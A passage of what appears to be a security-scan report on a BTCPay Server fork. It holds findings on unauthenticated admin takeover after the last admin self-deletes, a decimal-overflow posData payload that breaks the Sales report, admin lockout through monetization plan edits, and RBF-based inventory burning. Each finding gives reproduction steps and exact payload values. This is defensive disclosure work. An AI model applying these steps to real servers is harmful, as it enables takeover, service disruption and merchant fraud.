   The Greenfield self-deletion route DELETE /api/v1/users/me (DeleteCurrentUser, lines 318-320) delegates here and returns 403 when IsUserTheOnlyOneAdmin — the project forbids exactly the action the UI route permits, and asserts it in BTCPayServer.Tests/GreenfieldAPITests.cs:997-999 ('can't delete if the only admin').
6. [BTCPayServer/Controllers/UIServerController.Users.cs:329–343](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L329-L343)
   Admin-driven deletion refuses to remove the last enabled admin; ToggleUser (lines 374, 394) refuses to disable them and the user editor (line 183) refuses to strip the last admin's role. The 'at least one enabled admin' invariant is enforced on every path except UIManageController.DeleteUserPost.

## Impact
The attacker becomes server administrator: full read/write over every surviving user and store, hot-wallet signing and payouts, invoices and customer PII, server policies, email/storage credentials, plugins, maintenance and (where enabled) host administration. Total compromise of the BTCPay instance and of every tenant other than the departed admin.

## Reproduction steps
1. Precondition: the only enabled server admin deletes their own account through /account — a conscious, unwarned action (UI:ACTIVE); the resulting admin-less state is the attack requirement (AT:PRESENT). From then on an unauthenticated network peer needs only a single POST /api/v1/users with isAdministrator=true (the LockSubscription gate is skipped when no admin exists, so no open-registration setting is required), or POST /register where registration is open. No credentials, no race, and the attempt can be automated by polling; the register throttle (ZoneLimits.Register) is bypassed for the admin branch since `!isAdmin` is false.

## Recommended fix
1. UIManageController.DeleteUserPost lets the last enabled server administrator delete their own account, violating the invariant that every sibling deletion/disable/de-role path (including Greenfield DELETE /api/v1/users/me) enforces. Fix criteria: Self-deletion must be refused with an explanatory message when the caller is the only enabled server admin, mirroring UIServerController.DeleteUser and Greenfield DeleteUser. Verification: as the sole admin, POST /account/deleteuserpost leaves the account intact and the admin set non-empty; after a second enabled admin exists, self-deletion succeeds.
2. The first-admin bootstrap in GreenfieldUsersController.CreateUser and UIAccountController.Register keys solely on 'no user currently in ServerAdmin' and (for the API) suspends the registration lock in that state, so any later admin-less state re-opens anonymous admin creation. Fix criteria: The anonymous admin grant should apply only while initial setup has not completed (a persisted setup-completed marker set on first admin creation), and the LockSubscription gate should not be suspended merely because no admin exists. Verification: empty the admin set by any means on an instance with setup completed and confirm that anonymous POST /api/v1/users and POST /register do not yield a ServerAdmin account.

---
**Severity:** HIGH
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-269](https://cwe.mitre.org/data/definitions/269.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257275

---

# Payer-authored posData cart price×count overflow permanently breaks the merchant's Sales report

## Details
The store 'Sales' report (ProductsReportProvider) is a merchant-facing accounting view exposed in the UI (GET /stores/{storeId}/reports, view=Sales, CanViewReports) and via Greenfield (POST /api/v1/stores/{storeId}/reports). For every invoice in the requested range it walks the posData cart stored on the invoice and computes `item.Price * item.Count` as a decimal (ProductsReportProvider.cs:70).

posData is authored by the invoice creator and persisted verbatim by two writers that apply no cart arithmetic or bounds: the legacy Bitpay POST /invoices (anonymous when the store has AnyoneCanInvoice, BitpayAuthorizationHandler.cs:51-58; posData string -> Metadata.PosDataLegacy -> JObject.Parse) and Greenfield invoice creation (any API key with CanCreateInvoice; request.Metadata copied by InvoiceMetadata.FromJObject at UIInvoiceController.cs:171 with no metadata validation in GreenfieldInvoiceController.cs:169-240). The shared parser AppService.TryParsePosCartItems (495-528) bounds count only to > 0 and price only to >= 0; a cart such as `{"cart":[{"id":"x","count":2,"price":"79228162514264337593543950335"}]}` parses to Price = decimal.MaxValue, Count = 2 (its catch covers conversion errors only), and the report's multiplication then throws System.OverflowException (.NET decimal arithmetic is always checked). Nothing in ProductsReportProvider.Query, ReportService.Query (23-38) or either controller catches it, so the Sales report returns HTTP 500 (CWE-248 uncaught exception as the mechanism; CWE-1284 unvalidated quantities as the root cause).

The rows are emitted when the invoice belongs to an app: every store invoice is tagged APP#<id> for each app with TagAllInvoices (UIInvoiceController.cs:237, 280-283, the crowdfund option 'Count all invoices created on the store as part of the goal'), and the report iterates those apps directly (ProductsReportProvider.cs:30, 54-59). Unpaid invoices count (only Expired-with-ExceptionStatus.None invoices are skipped); the attacker keeps the invoice out of that state by paying any amount, or simply by supplying a far-future Bitpay expirationTime (BitpayInvoiceController.cs:132, no upper bound) or a large Greenfield Checkout.Expiration (minimum-only check). IncludeArchived = true (line 34) means archiving the offending invoice does not help and BTCPay has no invoice deletion, so the merchant's Sales report is unusable for any date range that includes the invoice time, via UI and API, at the cost of one request.

Secondary integrity effect on the same lines: Product, Quantity and CurrencyAmount are taken from the payer-asserted cart rather than from what was invoiced or paid, so the same writers let a payer insert rows claiming arbitrary product ids, quantities and amounts (e.g. a settled minimal invoice whose posData claims 1,000,000 of product X) into the merchant's Sales accounting and its Summary aggregates for tag-all apps.

The public PoS controller is not an entry point: it requires template item ids and computes price*count in PoSOrder.Calculate before CreateInvoiceCoreRaw, so an overflowing cart fails the payer's own request; a MaxValue price with count 1 survives but does not overflow at the report. Related verified records cover other sinks fed by the same posData (pos-cart-count-unbounded-stats-aggregation-dashboard-oom at AppService.cs:159; bitpay-posdata-cart-count-exhausts-tagall-crowdfund-perk-inventory at AppInventoryUpdaterHostedService.cs:40); this finding is the distinct Sales-report arithmetic sink.

Dependency assumption: Newtonsoft.Json 13.0.4 (BTCPayServer.csproj:49) `JToken.Value<decimal>()` on a string JValue converts via Convert.ChangeType/decimal.Parse with InvariantCulture, and on a float JValue via Convert.ToDecimal(double); the JSON-string form of decimal.MaxValue is the demonstrated payload.

## Evidence
1. [BTCPayServer/Services/Reporting/ProductsReportProvider.cs:63–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/ProductsReportProvider.cs#L63-L73)
   Primary sink. For every invoice of the store in range (IncludeArchived = true at line 34; only Expired-with-no-exception invoices are skipped at 46-47, so New/Processing/Settled/PaidPartial invoices all count), and for every TagAllInvoices app or APP#-tagged app (54-57), the Sales report parses Metadata.PosData.cart and emits `copy.Add(item.Price * item.Count)` (line 70). Price (decimal) and Count (int) are the stored payer values; .NET decimal multiplication always throws System.OverflowException past decimal.MaxValue and nothing here catches it, so Query() aborts for the whole report. The same lines take Product/Quantity/CurrencyAmount from payer-asserted cart data rather than from what was invoiced or paid.
2. [BTCPayServer/Services/Apps/AppService.cs:495–528](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L495-L528)
   TryParsePosCartItems is the shared parser: `JValue v => v.Value<decimal>()` (509-515) converts a JSON string such as "79228162514264337593543950335" (decimal.MaxValue) or a float such as 7.9e28 to decimal, and the only bounds are `count <= 0 || price < 0` (516). The `catch (FormatException or OverflowException)` covers conversion only; a successfully parsed MaxValue price with count >= 2 is returned to the caller.
3. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:139–140](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L139-L140)
   Writer 1: legacy Bitpay POST /invoices stores the request's free-form posData string into Metadata.PosDataLegacy; the setter (InvoiceEntity.cs:205-219) JObject.Parse()s it into the typed posData. No cart arithmetic or bounds are applied. Line 132 also takes the caller's expirationTime with only a 'too soon' check, so the poisoned invoice can be kept in status New indefinitely without paying.
4. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs:51–57](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs#L51-L57)
   CanCreateInvoice succeeds for the Anonymous Bitpay identity whenever the store blob has AnyoneCanInvoice (?storeId= in the query), so the Bitpay writer is reachable by an unauthenticated payer on such stores, throttled only by the publicinvoices zone (BitpayInvoiceController.cs:60-63); one request suffices.
5. [BTCPayServer/Controllers/UIInvoiceController.cs:170–171](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L170-L171)
   Writer 2: CreateInvoiceCoreRaw copies the Greenfield request's metadata JObject verbatim via InvoiceMetadata.FromJObject (posData lands in the JsonExtensionData dictionary unchanged), so an API key holding only CanCreateInvoice persists an unbounded cart without any store toggle.
6. [BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs:169–239](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs#L169-L239)
   POST /api/v1/stores/{storeId}/invoices (Policies.CanCreateInvoice) validates Amount, PaymentMethods, Expiration (minimum only, no maximum), PaymentTolerance and DefaultLanguage, but never inspects request.Metadata before passing it to CreateInvoiceCoreRaw at line 232.
7. [BTCPayServer/Controllers/UIInvoiceController.cs:280–282](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L280-L282)
   Every invoice of the store receives an APP#<id> internal tag for each app with TagAllInvoices (GetAppsTaggingStore, line 237); together with ProductsReportProvider.cs:30/54 this is why a Bitpay/Greenfield invoice's cart rows are emitted when the store has a crowdfund app with 'Count all invoices created on the store as part of the goal' (UpdateCrowdfundViewModel.cs:95-96).
8. [BTCPayServer/Services/ReportService.cs:23–37](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/ReportService.cs#L23-L37)
   ReportService.Query awaits report.Query(ctx) with no exception handling; GreenfieldReportsController.Query (125-137) and UIReportsController.StoreReports (63-65) do not catch either, and the registered exception filters only handle JsonObjectException/JsonHttpException, so the OverflowException surfaces as HTTP 500 for the merchant UI and the Greenfield reports API for any range containing the invoice.
9. [BTCPayServer/Plugins/PointOfSale/PoSOrder.cs:44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/PoSOrder.cs#L44)
   Contrast, not an entry point: the public PoS path requires template item ids and computes `UnitPrice * Count` in PoSOrder.Calculate before CreateInvoiceCoreRaw (UIPointOfSaleController.cs:313-317, 395), so an overflowing cart fails the payer's own request and is never persisted; a MaxValue price with count 1 does not overflow at the report either. The Bitpay and Greenfield writers bypass this recomputation.

## Impact
Availability: the merchant's Sales report (UI and Greenfield) is persistently unusable for any range covering the invoice time, including 'alltime'; the invoice cannot be deleted and the report ignores archiving. Other reports and the rest of the server are unaffected, so LOW. Integrity: the same lines let a payer insert arbitrary product/quantity/amount rows into the merchant's Sales accounting and Summary aggregates at trivial cost; rows remain tied to a visible invoice id and status, so LOW. No confidentiality impact.

## Reproduction steps
1. Attacker: an anonymous payer against a store with AnyoneCanInvoice (legacy Bitpay POST /invoices?storeId=..., a public surface the threat model names), or any holder of a CanCreateInvoice API key via Greenfield (no store toggle needed). One request with posData `{"cart":[{"id":"x","count":2,"price":"79228162514264337593543950335"}]}` creates an invoice; no writer or parser bounds the cart. The one condition outside the attacker's control is that the victim store has an app with TagAllInvoices (crowdfund 'Count all invoices created on the store as part of the goal'), which is what makes the report emit cart rows for a non-app invoice, hence AT:P. Thereafter any merchant request for the Sales report over a range containing the invoice throws OverflowException (HTTP 500), deterministically, in the UI and the Greenfield API, with no merchant interaction required. Depends on Newtonsoft.Json 13.0.4 JToken.Value<decimal>() converting a string JValue via decimal.Parse (documented public behaviour, not verified in the checkout).

## Recommended fix
1. ProductsReportProvider multiplies a payer-supplied decimal price by a payer-supplied int count without bounds or overflow handling, and the resulting exception escapes the report pipeline, so a single invoice renders the whole report unusable. Fix criteria: An invoice whose posData cart contains any price/count values must not prevent the Sales report from rendering: the per-line amount computation is guarded (overflow yields a null/flagged cell or the line is skipped) and/or the report pipeline isolates per-invoice failures. Verify by creating a Bitpay or Greenfield invoice with price "79228162514264337593543950335" and count 2 in a store with a tag-all crowdfund app and confirming the Sales report (UI and POST /api/v1/stores/{storeId}/reports) still returns 200 with the remaining rows.
2. posData carts written by the Bitpay and Greenfield invoice creators are persisted without the bounds the PoS path enforces, and the Sales report attributes product quantities and amounts to payer-asserted cart values rather than to invoiced or paid amounts. Fix criteria: Cart items accepted from external invoice creators are bounded (a sane maximum count and price, or validation against the app's template) and/or the Sales report derives CurrencyAmount for tag-all apps from the invoice's own price/paid amounts rather than trusting cart prices; verify that an anonymous Bitpay invoice cannot add rows whose CurrencyAmount exceeds the invoice price.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Integer Overflow
**CWE:** [CWE-1284](https://cwe.mitre.org/data/definitions/1284.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257776

---

# PlanUpdated lockout recomputation ignores admin role, letting monetization-store owners disable server admins

## Details
MonetizationHostedService protects server administrators from monetization lockouts in every path but one. UpdateUserLockout (202-213) skips users for whom IsAdminUser is true; AllUsersQuery (228-249) excludes admins and BypassMonetization users; the Registered handler returns early for admins; and the test DoesNotLockOutAdminSubscriber codifies the rule that an admin who happens to have a subscriber row must not be locked out.

The SubscriptionEvent.PlanUpdated handler (91-96) does not follow that rule. It calls UpdateUserLockoutStatus(ctx, plan) with userIds = null, so GetUserIdsInPlan (409-418) returns every ApplicationUserId attached to the plan and the raw SQL (374-393) sets LockoutEnabled = true, LockoutEnd = 'infinity' and a fresh SecurityStamp for each one whose subscription is inactive, or for all of them when the plan no longer has the can-access feature. The security-stamp invalidator then terminates their sessions. Neither the ServerAdmin role nor BypassMonetization is consulted.

Admins routinely have subscriber rows: any user created while monetization is active (admin 'Create user' defaults BypassMonetization to false, Greenfield/UI registration) is enrolled, and promoting them to ServerAdmin (UIServerController.Users.cs 184-196) does not remove the row or set BypassMonetization. The BypassMonetizationChanged(false) handler (128-143) also creates a row for an admin.

PlanUpdated is published by UIOfferingController.AddPlan/edit (618-622, 711), gated only by SubscriptionsPolicies.CanModifyOfferings on the monetization store, which every store Owner (CanModifyStoreSettings) or custom role holds. A co-owner of the monetization store can therefore edit the plan (e.g. untick can-access, or change any field while the admin's trial has lapsed) and every admin in the plan is immediately disabled: LockoutEnd = infinity makes IsDisabled true, DefaultLoginExtension (UserService.cs 155-170) refuses cookie, API-key and Basic logins, and the stamp rotation logs them out. BypassMonetization does not help because the rejection comes from DefaultLoginExtension, not the Monetization extension. If every admin is in the plan, the server has no administrator left who can log in to repair it; otherwise another admin must re-enable the victims manually. The same store-level actor cannot otherwise affect admin accounts (SubscriberSuspend goes through UpdateUserLockout, which skips admins).

Conditions: Monetization active; at least one ServerAdmin has an ApplicationUserId identity in the monetization offering (promoted user or bypass toggled); attacker holds CanModifyOfferings on the monetization store (store Owner or custom role). The admin themself editing the plan triggers the same self-lockout.

## Evidence
1. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:91–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L91-L95)
   On SubscriptionEvent.PlanUpdated the service calls UpdateUserLockoutStatus(ctx, pu.Plan) with userIds = null, i.e. for every user in the plan, with no admin or BypassMonetization filter.
2. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:367–417](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L367-L417)
   GetUserIdsInPlan (409-418) selects all ApplicationUserId identities in the plan; the UPDATE then sets LockoutEnabled = true, LockoutEnd = 'infinity' and rotates SecurityStamp for every such user whose subscription is inactive OR whenever the plan no longer carries can-access (NOT (ss.active AND @canAccess)), and invalidates their security stamps (401-403). Server admins and BypassMonetization users are not excluded.
3. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:202–212](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L202-L212)
   The sibling path UpdateUserLockout (SubscriberActivated/Disabled/PlanStarted) explicitly refuses to touch users for whom userService.IsAdminUser(user) is true. AllUsersQuery (228-249) likewise excludes admins and BypassMonetization users, and the Registered handler (164-168) skips admins. The PlanUpdated path is the only one without this guard.
4. [BTCPayServer.Tests/MonetizationTests.cs:59–96](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/MonetizationTests.cs#L59-L96)
   DoesNotLockOutAdminSubscriber asserts the maintainers' guarantee: a subscriber promoted to admin must not get LockoutEnd set when their subscription is disabled. The test exercises SubscriberDisabled only; PlanUpdated violates the same guarantee.
5. [BTCPayServer/Plugins/Subscriptions/Controllers/UIOfferingController.cs:618–711](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UIOfferingController.cs#L618-L711)
   AddPlan (POST add-plan / plans/{planId}/edit) is gated only by SubscriptionsPolicies.CanModifyOfferings on the offering's store (cookie auth, line 620); it rewrites the plan including its features (removing can-access deletes the subs_plans_features row, 699-707) and then publishes SubscriptionEvent.PlanUpdated(plan) (711) - the sole publisher of that event in the tree.
6. [BTCPayServer/Plugins/Subscriptions/SubscriptionsPlugin.cs:86–91](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionsPlugin.cs#L86-L91)
   CanModifyOfferings is includedByPermissions CanModifyStoreSettings, i.e. any Owner of the monetization store (or a custom role granted it) can edit plans.
7. [BTCPayServer/Controllers/UIServerController.Users.cs:180–199](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L180-L199)
   The user edit POST reads the current roles (180-182), promotes via SetAdminUser (191) and toggles BypassMonetization only if the admin changed the checkbox (194-199); promotion leaves the existing subscriber row and BypassMonetization = false untouched, so admins promoted from ordinary users remain members of the monetization plan and are selected by GetUserIdsInPlan.
8. [BTCPayServer/Services/UserService.cs:155–169](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L155-L169)
   DefaultLoginExtension rejects any IsDisabled user ('Your user account is currently disabled'). This check runs regardless of BypassMonetization and before any admin role consideration, so a locked admin cannot log in via cookie, API key or Basic auth until another admin re-enables them.

## Impact
Every enrolled server administrator in the plan is disabled: IsDisabled (ApplicationUser.cs:39-41) becomes true, DefaultLoginExtension (UserService.cs:155-170) refuses cookie, API-key and Basic logins regardless of BypassMonetization or role, and the SQL stamp rotation plus securityStampInvalidator drop live sessions. Another admin can re-enable the victim with SetDisabled(false), but the attacker re-locks them with the next plan save, and setting BypassMonetization does not help because the UPDATE ignores that column too; if every admin is enrolled, server administration is lost until database intervention. Account lockout state is written by a store-scoped actor (integrity LOW); no data is disclosed.

## Reproduction steps
1. Attacker: a non-admin member of the store that hosts the monetization offering holding btcpay.store.canmodifyofferings - the Owner role (StoreRepository.cs:396-398 defines an owner as a role carrying CanModifyStoreSettings, which includes CanModifyOfferings per SubscriptionsPlugin.cs:92) or a custom role. Steps: open the monetization plan's edit page, untick 'can-access' (locks every user in the plan) or save any field while a target admin's subscription is inactive (lapsed trial/expired), submit. PlanUpdated fires; MonetizationHostedService.cs:91-95 calls UpdateUserLockoutStatus with userIds = null, GetUserIdsInPlan returns every ApplicationUserId in the plan, and the raw UPDATE (374-393) sets LockoutEnabled = true, LockoutEnd = infinity and a new SecurityStamp with no ServerAdmin or BypassMonetization filter. The project explicitly denies this position that power on its sanctioned sibling path: SubscriberSuspend -> SubscriberDisabled -> UpdateUserLockout (202-213) refuses to touch admins, and DoesNotLockOutAdminSubscriber tests it. Precondition (AT:P): monetization active and at least one ServerAdmin has a subscriber row in the edited plan - the normal result of admin 'Create user' (BypassMonetization defaults to false when monetization is set up, UIServerController.Users.cs:263) followed by promotion via SetAdminUser, which leaves the row intact; the test itself constructs this state.

## Recommended fix
UpdateUserLockoutStatus, when driven by PlanUpdated (and MigrateUsers), applies the lockout SQL to every user in the plan without the admin-role / BypassMonetization exclusion that UpdateUserLockout, AllUsersQuery and the Registered handler enforce. Fix criteria: No Monetization code path may set LockoutEnd for a user who is a ServerAdmin or has BypassMonetization = true; PlanUpdated-triggered recomputation must exclude them (and ideally admins should have their subscriber identity detached or BypassMonetization set on promotion). Verify by promoting an enrolled user to admin, then editing the plan to remove can-access: the admin must remain able to log in (LockoutEnd null), mirroring DoesNotLockOutAdminSubscriber.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257714

---

# PoS/crowdfund inventory never restored when a paid-unconfirmed invoice fails to confirm (Processing to Invalid)

## Details
Stock for PoS items and crowdfund perks is reserved when an invoice is created (AppInventoryUpdaterHostedService.ProcessEvent: deduct = -1 on InvoiceEvent.Created) and released only on InvoiceEvent.Expired or InvoiceEvent.MarkedInvalid; the switch's default branch returns for every other event. The invoice state machine has a third unpaid terminal transition the service ignores: a Processing invoice (full on-chain payment seen but below the store's required confirmations) whose MonitoringExpiration has passed with minimumDue > 0 is set to Invalid with InvoiceEvent.FailedToConfirm (InvoiceWatcher.UpdateInvoice lines 156-170). UpdateInvoice has no branch for an Invalid invoice, so nothing later returns the units.

An anonymous payer can trigger this deliberately and keep their funds. Order the full remaining stock of a limited item (quantity up to Inventory is accepted at UIPointOfSaleController.cs:302-304; crowdfund perks at UICrowdfundController.cs:147-150), then pay the invoice on-chain with a transaction whose fee rate is below what miners are including. NBXplorerListener records the payment with ConfirmationCount 0 and Status Processing because ConfirmationRequired (lines 365-374) is 1 for MediumSpeed (the new-store default, StoreData.cs:29), 2 for LowMediumSpeed, 6 for LowSpeed, and also 1 for HighSpeed when the transaction signals RBF (line 368), so a replaceable payment is never 0-conf-settled under any speed policy. The watcher moves the invoice New -> Processing (PaidInFull, lines 97-117), which takes it off the Expired path that restores stock. If the transaction is still unconfirmed when MonitoringExpiration passes (default InvoiceExpiration 15 min + MonitoringExpiration 1 day, StoreBlob.cs:23,26), the invoice becomes Invalid via FailedToConfirm and the reserved units are permanently gone. The payer then replaces the transaction (RBF) back to themselves, or simply lets it be evicted from mempools: NBXplorerListener marks the payment Unaccounted (line 335) and publishes InvoiceNeedUpdateEvent, but UpdateInvoice has no handling for Status Invalid so inventory is never compensated. Net cost is one transaction fee; the merchant's item shows as exhausted (Inventory <= 0) until the template is edited by hand.

A payment replaced before MonitoringExpiration is handled correctly: lines 148-153 revert Processing -> New and, because the watcher loop re-runs UpdateInvoice until no events are produced (StartLoop, lines 282-309), the invoice then Expires and the Expired event restores stock. The gap is specifically the FailedToConfirm path. This is independent of the verified check-then-act race and under-decrement findings at this file, which concern the decrement side; this is the missing compensation on a reachable unpaid terminal state.

## Evidence
1. [BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs:34–45](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs#L34-L45)
   Inventory is decremented on Created and restored only on Expired or MarkedInvalid; the default branch returns for every other event, including FailedToConfirm (Processing -> Invalid). This is the code the fix must change.
2. [BTCPayServer/HostedServices/InvoiceWatcher.cs:156–170](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L156-L170)
   A Processing invoice whose unconfirmed payments have not reached the required confirmations by MonitoringExpiration is set to Invalid with InvoiceEvent.FailedToConfirm, an event the inventory service ignores.
3. [BTCPayServer/HostedServices/InvoiceWatcher.cs:91–117](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L91-L117)
   Any accounted full payment, confirmed or not, moves a New invoice to Processing (PaidInFull), taking it off the Expired path that would restore stock.
4. [BTCPayServer/HostedServices/InvoiceWatcher.cs:133–153](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L133-L153)
   The only compensation for a replaced payment runs while the invoice is still Processing (revert to New, then Expired restores stock). Once the invoice is Invalid no branch of UpdateInvoice applies, so a replacement after MonitoringExpiration leaves the units unrestored.
5. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:365–377](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L365-L377)
   ConfirmationRequired: 1 confirmation for MediumSpeed (store default), 2/6 for the slower policies, and 1 for HighSpeed when the payment signals RBF. An unconfirmed replaceable payment therefore stays PaymentStatus.Processing under every speed policy, keeping the invoice in Processing until it either confirms or fails to confirm.
6. [BTCPayServer/Data/StoreBlob.cs:23–26](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/StoreBlob.cs#L23-L26)
   Default InvoiceExpiration is 15 minutes and default MonitoringExpiration is 1 day: the payer's transaction must remain unconfirmed for that window for the FailedToConfirm transition to fire.
7. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:297–314](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L297-L314)
   The anonymous payer may order up to the full available inventory of an item; items with Inventory <= 0 are refused as exhausted, so a burned reservation makes the item unsellable.
8. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–191](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L191)
   The PoS order endpoint is public: HttpPost without [Authorize], IgnoreAntiforgeryToken, EnableCors(All).
9. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:128–150](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L128-L150)
   Same mechanism for crowdfund perks on the public contribute endpoint: ItemCode-based decrement on creation; perks with Inventory <= 0 are refused to contributors.
10. [BTCPayServer/Events/InvoiceEvent.cs:34](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Events/InvoiceEvent.cs#L34)
   FailedToConfirm is a distinct event name from Expired and MarkedInvalid, so it falls through the inventory service's switch.

## Impact
Merchant inventory data in the app template becomes permanently wrong (integrity) and the affected items are refused as exhausted until manually corrected (loss of the sales function for those items); no data exposure, no server-wide impact, merchant funds are not taken.

## Reproduction steps
1. Anonymous payer on the public PoS/crowdfund page orders the remaining stock, broadcasts an RBF-signalling payment at a fee rate miners are not including so it stays unconfirmed past the invoice's monitoring window (default 15 min + 1 day), then replaces it back to themselves. No privileges, no victim interaction, no race. AT:PRESENT because the store must track inventory for the item and the fee market must allow a low-fee transaction to remain unconfirmed for about a day, a condition the attacker selects for by fee choice but does not fully control.

## Recommended fix
